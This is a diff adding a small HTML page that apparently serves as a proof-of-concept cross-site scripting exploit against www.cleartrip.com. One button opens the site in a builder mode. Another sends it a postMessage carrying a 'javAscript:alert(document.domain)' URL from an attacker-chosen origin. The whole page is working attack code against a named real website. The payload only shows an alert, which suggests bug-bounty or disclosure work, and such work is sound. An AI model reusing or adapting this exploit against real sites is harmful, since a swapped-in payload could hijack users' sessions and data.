@@ -1,0 +1,28 @@
+<html>
+
+<body>
+
+    <button onclick="open_cleartrip()">click me to open www.cleartrip.com</button>
+    <button onclick="simple_alert()">click me for simple xss</button>
+    <script>
+        async function open_cleartrip() {
+
+            win_attcker = window.open("https://www.cleartrip.com/?ctActionMode=ctBuilder");
+
+        }
+
+        function simple_alert() {
+            win_attcker.postMessage({
+                "originUrl": "https://jassertoubib.github.io",
+                "url": "javAscript:alert(document.domain)//",
+                "variant": true,
+                "message": "Dashboard",
+                "evtMaster": [{}],
+                "details": "test",
+                "personalisation": "test"
+            }, "*")
+        }
+    </script>
+</body>
+
+</html>
